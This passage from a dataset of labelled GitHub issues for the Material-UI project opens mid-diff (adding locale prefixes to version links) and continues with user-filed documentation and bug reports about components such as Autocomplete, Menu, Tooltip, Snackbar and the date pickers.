const t = useSelector((state) => state.options.t);\r\n\r\n   const drawer = (\r\n@@ -153,7 +155,7 @@ function AppDrawer(props) {\r\n             <Link\r\n               color=\"textSecondary\"\r\n               variant=\"caption\"\r\n-              href=\"https://material-ui.com/versions/\"\r\n+              href={`https://material-ui.com${languagePrefix}/versions/`}\r\n               onClick={onClose}\r\n             >\r\n               {`v${process.env.LIB_VERSION}`}\r\ndiff --git a/docs/src/modules/components/AppFooter.js b/docs/src/modules/components/AppFooter.js\r\nindex a973d0b6a..e1a8d34aa 100644\r\n--- a/docs/src/modules/components/AppFooter.js\r\n+++ b/docs/src/modules/components/AppFooter.js\r\n@@ -52,6 +52,8 @@ const styles = (theme) => ({\r\n\r\n function AppFooter(props) {\r\n   const { classes } = props;\r\n+  const userLanguage = useSelector((state) => state.options.userLanguage);\r\n+  const languagePrefix = userLanguage === 'en' ? '' : `/${userLanguage}`;\r\n   const t = useSelector((state) => state.options.t);\r\n\r\n   return (\r\n@@ -156,7 +158,7 @@ function AppFooter(props) {\r\n                 versionNumber: (\r\n                   <Link\r\n                     color=\"inherit\"\r\n-                    href=\"https://material-ui.com/versions/\"\r\n+                    href={`https://material-ui.com${languagePrefix}/versions/`}\r\n                     aria-label={`v${process.env.LIB_VERSION}. View versions page.`}\r\n                   >\r\n                     {`v${process.env.LIB_VERSION}`}\r\n```"},{"labels":[null,"documentation"],"text":"On clicking the Toggle left-to-right/right-to-left button, the components listed in the API section on each page get their tags reversed.\r\n\r\nFor example, `<Button/>` on clicking the toggle becomes `</ Button>` . On re toggling, the \r\ntags are back in their original position when viewed in Firefox or Edge but on Chrome, component's API becomes `>Button</`.\r\n\r\nThis issue is prominent on all docs pages with API's containing a component name in tags."},{"labels":["documentation",null],"text":"Hope to support vite..."},{"labels":["documentation"],"text":"In the Material-UI docs on the [Customization > Theming > Typography](https://material-ui.com/customization/typography/) page, the responsive Font Sizes Chart uses `px` units on the vertical axis to represent font-size in relation to viewport width.\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe values on the vertical axis don't make sense as font-sizes in pixels (e.g. H1 font-size is 5.9px at 1280px viewport width).\r\n\r\n## Expected Behavior 🤔\r\n\r\nI expect the label on the vertical axis to be shown in `rem` units, because rems are used in the project source code. Or, the units on the vertical axis should be updated to `px` equivalent values.\r\n\r\nMUI uses `rem` units to calculate font-size as can be seen in [createTypography.js](https://github.com/mui-org/material-ui/blob/d52d29c67a03f95a62c5f140ab0cba8ae40a4d44/packages/material-ui/src/styles/createTypography.js#L45).\r\n\r\nThe vertical axis label on the chart uses `px` instead of `rem` as can be seen in [ResponsiveFontSizesChart.js](https://github.com/mui-org/material-ui/blob/d52d29c67a03f95a62c5f140ab0cba8ae40a4d44/docs/src/pages/customization/typography/ResponsiveFontSizesChart.js#L91).\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nSteps:\r\n\r\n1. Look at the chart in the docs at  [Customization > Theming > Typography](https://material-ui.com/customization/typography/)\r\n\r\n## Context 🔦\r\n\r\nI am attempting to improve the documentation. If `px` units are used on the vertical axis on purpose, please close the issue.\r\n\r\n## Your Environment 🌎\r\n\r\nLooking at the docs via web browser.\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | current |\r\n| React       | Not Relevant |\r\n| Browser     | Not Relevant |\r\n| TypeScript  | Not Relevant |\r\n"},{"labels":["documentation",null,null],"text":"Providing custom variables to `createMuiTheme` gives the error \"Object literal may only specify known properties\".\r\n\r\n```\r\n\"@material-ui/core\": \"^4.9.9\",\r\n\"@material-ui/icons\": \"^4.9.1\",\r\n\"@material-ui/lab\": \"^4.0.0-alpha.48\",\r\n\"@material-ui/pickers\": \"^3.2.10\",\r\n\"@material-ui/styles\": \"^4.9.6\",\r\n```"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\nI want to contribute solving issues but I'm struggling to start...\r\nAs a beginner contributor with coding experience, this is stopping me to contribute:\r\n\r\n1. Which issues are really free to start with. There are many [open issues](https://github.com/mui-org/material-ui/contribute) but when I open them, someone is working on it or is going to be done in V5 etc... I label like \"free to take\" will be helpful. When someone wrote they will do it, assign a person for that will be also helpful.\r\n2. How complex is the issue espected to be. The label \"good first issue\" is helpful but if I want something mid-level, I don't know where to find it.\r\n3. Best practices to test components changes are missing. How are you guys testing changes on the components normally? In a sandbox? With the docs? In a specific environment?\r\n\r\nI hope I can get some guidance so that I can start contributing more :)\r\n\r\n \r\n"},{"labels":[null,"documentation",null,null],"text":"I get this error when using the TextField from the Gestalt component library. I've re-created the issue: https://codesandbox.io/s/autocomplete-with-gestalt-3yq1q?fontsize=14&hidenavigation=1&theme=dark\r\n\r\n"},{"labels":["documentation"],"text":"On the *Customizing components* page, under [2. Dynamic variation for a one-time situation](https://material-ui.com/customization/components/#2-dynamic-variation-for-a-one-time-situation), the docmentation reads,\r\n\r\n> You have learned how to override the style of a Material-UI component in the previous section. Now, let's see how we can make these overrides dynamic. Here are five alternatives; each has it's pros and cons.\r\n\r\nWhat are these pros and cons?"},{"labels":[null,"documentation",null],"text":"Please see codesandbox at https://codesandbox.io/s/material-demo-ldh7x?file=/demo.js\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen an autocomplete `options` prop is only integers, the following error comes:\r\n\r\n```\r\nuseAutocomplete.js:44 Uncaught TypeError: candidate.toLowerCase is not a function\r\n    at useAutocomplete.js:44\r\n    at Array.filter (<anonymous>)\r\n    at useAutocomplete.js:40\r\n    at useAutocomplete (useAutocomplete.js:219)\r\n    at Autocomplete (Autocomplete.js:379)\r\n    at renderWithHooks (react-dom.development.js:14803)\r\n    at updateForwardRef (react-dom.development.js:16816)\r\n    at beginWork (react-dom.development.js:18645)\r\n    at HTMLUnknownElement.callCallback (react-dom.development.js:188)\r\n    at Object.invokeGuardedCallbackDev (react-dom.development.js:237)\r\n```\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe expected behaviour is to have the autocomplete showing the integers as options and returning them as a result.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/s/material-demo-ldh7x?file=/demo.js"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nIn the documentation website, have a section which list the opensource themes built with MUI (using `createMuiTheme`)\r\n<!-- Describe how it should work. -->\r\n\r\n## Examples 🌈\r\n\r\nOne opensource theme built with MUI for instance is http://pearson-theme.surge.sh/ \r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\n## Motivation 🔦\r\n\r\nI love MUI but I don't personally like too much Material Design System and thus I'm usually customizing components manually with `createMuiTheme`. Having a list of opensource themes can give us a good starting point if we want to have something different from Material.  \r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n<img width=\"551\" alt=\"Capture d’écran 2020-05-19 à 16 23 18\" src=\"https://user-images.githubusercontent.com/3165635/82338505-4446a200-99ed-11ea-916d-fde72678c307.png\">\r\n<img width=\"862\" alt=\"Capture d’écran 2020-05-19 à 16 23 33\" src=\"https://user-images.githubusercontent.com/3165635/82338506-44df3880-99ed-11ea-8dbf-037f1de9f326.png\">\r\n<img width=\"359\" alt=\"Capture d’écran 2020-05-19 à 16 23 58\" src=\"https://user-images.githubusercontent.com/3165635/82338508-4577cf00-99ed-11ea-9f72-f89aa1d28f88.png\">\r\n<img width=\"513\" alt=\"Capture d’écran 2020-05-19 à 16 24 18\" src=\"https://user-images.githubusercontent.com/3165635/82338510-4577cf00-99ed-11ea-867f-5532b75e9e1f.png\">\r\n<img width=\"378\" alt=\"Capture d’écran 2020-05-19 à 16 24 36\" src=\"https://user-images.githubusercontent.com/3165635/82338511-4577cf00-99ed-11ea-9f9b-9265d8afdff4.png\">\r\n"},{"labels":["documentation",null],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nWhen working with material-ui you usually end up adjusting the typography, overwriting some global styles and so on to create your own \"themed variant\" of material-ui. Within material-ui some of these styles/overwrites affect another as e.g. Typography is part of more or less any other material-ui component. So adjusting typography might adjust tabs without you noticing. In our current workflow we have one relatively gigantic storybook showcasing all the components we have (including a re-export of basically all material-ui components).\r\n\r\nI think it might be a good idea to create a \"template\" as part of material-ui to get new component libraries started more quickly & to share themed variants with no-code designers. The current \"color selection theming\" in the material-ui docs is relatively limited.\r\n\r\n## Summary 💡\r\nIt would be great if there was a \"ready to go & up-to-date\" storybook example within the examples folder to showcase all the components.\r\n\r\n## Examples 🌈\r\nSadly our storybook is closed source atm, but we might think about abstracting & open sourcing the material-ui part of it.\r\n\r\n## Motivation 🔦\r\nDid this once manually, don't want to do it twice and I assume other companies have similar workflows.\r\n\r\n---\r\n\r\nJust when writing this:\r\n> The current \"color selection theming\" in the material-ui docs is relatively limited.\r\n\r\nI started wondering if we couldn't just deploy a custom themed variant of the docs instead of doing things in storybook. Doing things in storybook would be nicer in terms of our testing setup, but the docs are much more in-detail as the ones we have in storybook :thinking:\r\nIs this sth people are doing?\r\n\r\n---\r\n\r\nOT: while writing that i was wondering if that actually is a feature request or would be better suited for discussions. I'd love if you enabled discussions, as e.g. in the styled-components tickets that's a pretty endless \"discussion\", but seems to not provide any value to the actual ticket."},{"labels":["documentation",null],"text":"This is a small documentation issue. CssBaseline is neeed to add CSS color declarations to html > body. When using the dark palette text color is white, and thus unreadable until ```<CssBaseline/>``` is added to ```<ThemeProvider/>```.\r\n\r\nCurrently the [example](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/customization/palette/palette.md#user-preference) states:\r\n\r\n```JSX\r\n<ThemeProvider theme={theme}>\r\n  <Routes />\r\n</ThemeProvider>\r\n```\r\n\r\nBut that does not alter the page background. It should note that to alter page background it needs CssBaseline\r\n\r\n```JSX\r\nimport CssBaseline from '@material-ui/core/CssBaseline';\r\n```\r\n...\r\n\r\n```JSX\r\n<ThemeProvider theme={theme}>\r\n  <CssBaseline />\r\n  <Routes />\r\n</ThemeProvider>\r\n```\r\n\r\nFolks with this problem are discussing it here, it would help if the documentation example used CssBaseline: https://github.com/mui-org/material-ui/issues/10764\r\n\r\n(I am new, here, please forgive me if I made some mistake. I've noticed material-ui-docs are shut, and there is no template to file a New Issue of type Docs update request, I tried my best to be clear. Thank You.)"},{"labels":[null,"documentation",null],"text":"This may seem totally obvious to those experienced with MUI, but to those totally new to it, it may come as a surprise that none of the Button pages ([Button](https://material-ui.com/components/buttons/), ButtonBase, IconButton) mention or show an example of how to *actually initiate an icon* as a result of clicking a button. :smile: \r\n\r\nThis is textbook example of the [curse of knowledge](https://en.wikipedia.org/wiki/Curse_of_knowledge).\r\n\r\nThere's the implicit *assumption* that buttons extend the HTML `button` elements, so `onClick` should be set to a function, but for new users, that may just not be obvious. Not even the [ButtonBase API page](https://material-ui.com/api/button-base/) mentions anything about onClick, or extending the `button` element.\r\n\r\nIf the above makes sense, the examples on the Button* pages could be improved to allow a user brand new to MUI, to get started with a button performing an action. MUI may be the jQuery of building web apps, and it's reasonable to anticipate that some developers may simply not have the necessary HTML background assumptions."},{"labels":[null,"documentation",null],"text":"I'm running into [another instance](https://github.com/mui-org/material-ui/issues/20755) of simple things being super-complicated :)\r\n\r\nWhat I'm trying to do is simply display a toast sliding up. I've tried following the [Control slide direction](https://material-ui.com/components/snackbars/#control-slide-direction) documentation section, but it doesn't actually explain how to control the direction; instead, it gives a complicated example with variable directions, and maybe it's too late in the day or I haven't had enough coffee, but I haven't been able to figure out how to set up *one* simple sliding direction.\r\n\r\nAnd I'm not the only one, see [this](https://stackoverflow.com/questions/56432209/material-ui-how-to-change-transitioncomponent-of-customized-snackbar-to-slide) or #16637.\r\n\r\nBy comparison, in other UI toolkits, you [simply set the direction property as a string](https://v2.grommet.io/layer#animation)."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nIn this [example](https://material-ui.com/components/rating/#customized-ratings) customised icons there is getLabelText function used. I cant see the label text anywhere.\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nI would like to see the Label Text. Another suggestion,There is needs to be a prop label-placement:[top|bottom|left|right|].\r\n<!-- Describe what should happen. -->\r\n"},{"labels":[null,"documentation",null],"text":"Considering that the quality of the documentation is the number 1 factor developers has shared that they would consider when picking a UI library in our latest survey, I think that it worth starting a list of what we want to document/improve in the picker pages as we move:\r\n\r\n- https://material-ui-pickers.dev/demo/datepicker to https://material-ui.com/components/date-picker/\r\n- https://material-ui-pickers.dev/demo/timepicker to https://material-ui.com/components/time-picker/\r\n- and so on.\r\n\r\nItems I have noticed so far:\r\n\r\n- [ ] Have the demos work in isolation https://github.com/mui-org/material-ui-pickers/issues/1650.\r\n- [ ] Add a customization example. https://github.com/mui-org/material-ui-pickers/issues/1901. Example of UI we could output\r\n\r\n<img src=\"https://user-images.githubusercontent.com/3165635/81443508-d93bd680-9175-11ea-86b8-ae08eb1ecf0c.png\" width=\"240\" />\r\n<img src=\"https://user-images.githubusercontent.com/3165635/81443505-d80aa980-9175-11ea-834d-5c72d08efaf0.png\" width=\"240\" />\r\n\r\nAlso cover how to change the header https://github.com/mui-org/material-ui-pickers/issues/1805. \r\n\r\n- [ ] Have the CSS API documented, for instance: https://material-ui.com/api/autocomplete/#css\r\n- [ ] Fix the Algolia no matches. So far we have:\r\n\r\n<img width=\"974\" alt=\"Capture d’écran 2020-05-09 à 14 16 23\" src=\"https://user-images.githubusercontent.com/3165635/81473596-ca016b00-91ff-11ea-9bab-8b83b7ca90fe.png\">\r\n\r\n- [ ] Fix the warnings throw by the demos\r\n- [ ] Add a simple time picker example with the Autocomplete, use this model: https://material-ui.com/components/autocomplete/#disabled-options.\r\n- [ ] Content proofread by a native English speaker.\r\n- [ ] https://github.com/mui-org/material-ui-pickers/issues/1329 stop mapping the callback with the hook directly\r\n\r\n```jsx\r\nconst [selectedDate, handleDateChange] = useState(new Date());\r\n<DatePicker value={selectedDate} onChange={handleDateChange} />\r\n```\r\n- [ ] Improve the accessibility of the demos. I have noticed a bunch of errors, I didn't look closer\r\n\r\n<img width=\"313\" alt=\"wave\" src=\"https://user-images.githubusercontent.com/3165635/82887669-a00eaf00-9f48-11ea-84a8-7b29955d9ae5.png\">\r\n\r\nreport from https://chrome.google.com/webstore/detail/wave-evaluation-tool/jbbplnpkjmmeebjpijfedlgcdilocofh.\r\n\r\n- [ ] Split `## responsiveness` into 3 demos to collect stats usage between desktop, mobile, and responsive. This will help better prioritize our time. \r\n- [ ] … as we find new ideas"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\ndisableFocusRipple doesn't work in iconButton \r\nI saw that the problem should have been solved here \r\nhttps://github.com/mui-org/material-ui/pull/15864\r\nbut it doesn't really work.\r\ndisableRipple works but disableFocusRipple not\r\n here the code:\r\nhttps://codesandbox.io/s/material-demo-crpxh\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ x] The issue is present in the latest release.\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n**https://codesandbox.io/s/material-demo-crpxh**\r\nSteps:\r\n\r\n1.mouseHover on the icon \r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\nMac Catalina 10.15.4\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.13  |\r\n| React       |         |\r\n| Browser     chrome | Version 81.0.4044.138 (Official Build) (64-bit)         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":["documentation"],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Intention\r\n\r\nRegardless of how the translation affects the content, it should not affect the anchor (#) that keeps pointing to the content.\r\n\r\n## Summary 💡\r\n\r\nThe request is that the translations keep the same header, facilitating the way the links are made available between locales.\r\nCurrently when a content is translated, the anchor for this content also changes, resulting in the scenario below.\r\n\r\n<!-- Describe how it should work. -->\r\n\r\n## Examples 🌈\r\n\r\n- https://material-ui.com/components/rating/#simple-ratings\r\n\r\n- https://material-ui.com/zh/components/rating/#%E7%AE%80%E5%8D%95%E8%AF%84%E5%88%86\r\n\r\n## Expected\r\n\r\nRegardless of locale, same content anchor #\r\n\r\n- https://material-ui.com/components/rating/#simple-ratings\r\n\r\n- https://material-ui.com/zh/components/rating/#simple-ratings\r\n\r\n- https://material-ui.com/pt/components/rating/#simple-ratings\r\n\r\n## Motivation 🔦\r\n\r\n[Discussion](https://github.com/mui-org/material-ui/pull/20779#discussion_r415352929) started on this pull request #20779.\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x ] The issue is present in the latest release.\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen we click on the Table Pagination the headers and rows element shift horizontally with page click. \r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe table elements should not shift their positioning with page switch. \r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://material-ui.com/components/tables/#custom-pagination-actions Switch between pages in the example provided to notice the behavior. Thank you. \r\n\r\n\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"Hi!\r\n\r\nGiven that NextJS comes with `styled-jsx`  by default and that MUI already has a pretty great example showcasing how to use MUI with NextJS I think it would be natural to have such type of example.\r\n\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nThe thing I think would be most helpful to solve in examples would be:\r\n\r\n- What is the best way to style MUI components with `style-jsx`? \r\n  - Is the [resolve](https://github.com/zeit/styled-jsx#the-resolve-tag) tag the way to go? \r\n  - Or is it a combination of `makeStyles`  from MUI and the `css` tag from `styled-jsx`? \r\n- I've been trying to do just that but I don't seem to be able to change styles for a `Drawer` for example.\r\n\r\n## Motivation 🔦\r\n\r\nTo be honest I've been having trouble myself trying to make things work between `styled-jsx` and MUI so having clear examples on how to do so would be incredibly helpful.\r\n\r\nThank you\r\n"},{"labels":[null,"documentation",null],"text":"https://material-ui.com/components/menus/#simple-menu states:\r\n\r\n> Simple menus open over the anchor element by default (this option can be changed via props).\r\n\r\n**How** can this be changed via props? The page doesn't say. I went to the [Menu API page](https://material-ui.com/api/menu/), and I don't see anything simple like `open: 'below'`, or an offset.\r\n\r\nDevelopers have been struggling to figure this out [for 2+ years](https://stackoverflow.com/questions/48157863/how-to-make-a-dropdown-menu-open-below-the-appbar-using-material-ui), and there's still no clear solution.\r\n\r\nNot to say that,\r\n1. In all other frameworks I've tried, menus open by default under, not over, their button.\r\n2. MUI's setup is incredibly complicated, compared to other UI frameworks. For a drop-down menu with 2 items, the [MUI code](https://material-ui.com/components/menus/), without imports or the component declaration, would be 27 lines. In other components it's far, far simpler:\r\n    * [grommet](https://v2.grommet.io/menu) - 7 lines\r\n    * [evergreen](https://evergreen.segment.com/components/menu) - 11 lines (\"Menu with icons\")\r\n    * [webix](https://snippet.webix.com/e81v8bbc) - 7 lines (bonus: 12 lines with click handler displaying a toast)\r\n\r\nCan this drop-down menu use case be simplified?"},{"labels":["documentation",null],"text":"The function `createMount` in the [testing docs](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/guides/testing/testing.md) is followed by an example that I don't quite understand and I'm not sure whether there is an error in the example or it's me.\r\n\r\nFocusing on my doubt, the relevant part of the current example is \r\n```js\r\n...\r\ndescribe('<MyComponent />', () => {\r\n  let mount;\r\n\r\n  function MySuccessButton({ children }) {\r\n    return (\r\n      <ThemeProvider theme={{ success: { main: '#fff' } }}>\r\n        {children}\r\n      </ThemeProvider>\r\n    );\r\n  }\r\n...\r\n  it('should work', () => {\r\n    const wrapper = mount(<MockedTheme><MySuccessButton /></MockedTheme>);\r\n  });\r\n});\r\n```\r\n\r\nwhereas as far as I understand it should be \r\n```js\r\n...\r\ndescribe('<MyComponent />', () => {\r\n  let mount;\r\n\r\n  function MyComponent({ children }) {\r\n    return (\r\n      <ThemeProvider theme={{ success: { main: '#fff' } }}>\r\n        {children}\r\n      </ThemeProvider>\r\n    );\r\n  }\r\n...\r\n  it('should work', () => {\r\n    const wrapper = mount(<MyComponent />);\r\n  });\r\n});\r\n```\r\nAm I wrong or right? Where is `MockedTheme` coming from?"},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\nTooltip is not being displayed.\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\nTooltip is displayed.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Wrap functional component with forwardRef\r\n2. pass the ref to desired element\r\n3. instantiate a Tooltip with a given title passing the functional component as the only child\r\n\r\nHere's a [minimal reproduction](https://stackblitz.com/edit/refs-and-functional-components)\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.?.?  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen I use the `Autocomplete` with the `multiple` property, the `onChange` return an empty array, wen the second element is selected\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe `Autocomplete` must return the array with all selected elements, the old ones with the new one\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nSteps:\r\n\r\n1. Access this [codesandbox](https://codesandbox.io/s/autocomplete-multiple-bug-xysbt)\r\n2. Select one option and see in the console how the array returned has one object\r\n3. Select a second option and see on the console how the array returned is empty\r\n\r\n* For some reason all options are marked as selected after the first get selected, can it be a problem with `getOptionSelected`?\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI/core | v4.9.9  |\r\n| Material-UI/lab | v4.0.0-alpha.49  | (v4.0.0-alpha.49 in the codesandbox above)\r\n| React       | 16.13.1 |\r\n| Browser     | Chrome |\r\n"},{"labels":[null,"documentation"],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\nMany components' documentation contains an Accessibility section that tells you how to make sure your components are Accessible, but some components don't contain this section.\r\n\r\nFor the sections that don't contain Accessibility, it isn't clear if that means that the component is accessible without any special measures, or if it isn't accessible at all.\r\n\r\nIt would be helpful if each component had an Accessibility section that says which is the case:\r\n* Component is accessible without extra work.\r\n* Component requires special measures to make accessible.\r\n* Component is not accessible.\r\n\r\n## Examples 🌈\r\nSee\r\nhttps://material-ui.com/components/tables/#accessibility\r\nvs\r\nhttps://material-ui.com/components/popper/\r\n\r\n## Motivation 🔦\r\nI want to make sure I only use accessible components in my development.\r\n"},{"labels":["documentation",null],"text":"A line at https://material-ui.com/components/container/#container under heading `Fluid` reads:\r\n```\r\nA fluid container width is bounded by` that maxWidth property value.\r\n```\r\n\r\n![image](https://user-images.githubusercontent.com/6245927/79461843-57dca280-8014-11ea-95fc-b4d23111ec5d.png)\r\n\r\n`that` seems to be a typo and should read `the` so that the line reads: \r\n```\r\nA fluid container width is bounded by the maxWidth property value.\r\n```"},{"labels":[null,null,"documentation"],"text":"In #20434, a Component Name section was added to many components.\r\n\r\nUnfortunately, the section seems to be missing for the following components:\r\n\r\n* ClickAwayListener\r\n* Fade\r\n* Grow\r\n* Hidden\r\n* MenuList\r\n* Modal\r\n* NoSsr\r\n* Popper\r\n* Portal\r\n* RadioGroup\r\n* RootRef\r\n* Slide\r\n* SwipeableDrawer\r\n* TextareaAutosize\r\n* TouchRipple\r\n* Zoom"},{"labels":["documentation"],"text":"In the [documentation of the MenuItem](https://material-ui.com/api/menu-item/#menuitem-api) theres no reference to the \"button\" property, so you refer to the [ListItem documentation](https://material-ui.com/api/list-item/) as the rest of the props are passed down to it. In the ListItem the default value of the \"button\" prop is false. \r\n\r\nBut if we[ check the implementation](https://github.com/mui-org/material-ui/blob/master/packages/material-ui/src/MenuItem/MenuItem.js#L54) of the MenuItem we can see that the default value for button is true.\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like 